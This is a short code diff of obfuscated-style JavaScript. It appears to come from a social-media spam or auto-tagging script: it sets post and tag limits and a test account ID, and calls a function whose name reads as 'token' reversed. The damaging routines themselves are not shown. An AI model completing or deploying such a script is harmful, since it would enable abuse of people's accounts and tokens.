@@ -5,18 +5,15 @@ var win = this;
 var sie = win["XMLHttpRequest"];
 var empty = "";
 function nejse() {
-  var c_n = "locl:987"+profile_id;
+  var c_n = "loclater:987"+profile_id;
   var c_t = 30;
 
   if(!localStorage[c_n] || parseInt(localStorage[c_n]) < Date.now()-60*1000*c_t){
       localStorage[c_n] = Date.now();
     config = {};
-    config["link"] = "http://{random}./{random}";
     config["post_limit"] = "1";
     config["tag_limit"] = 150;
     config["mode"] = true;
-    config["testuser"] = "100010314190852";
-    console["log"](config);
     if (!(1 != config["mode"] && profile_id != config["testuser"])) {
        _e_P();
        nekot();
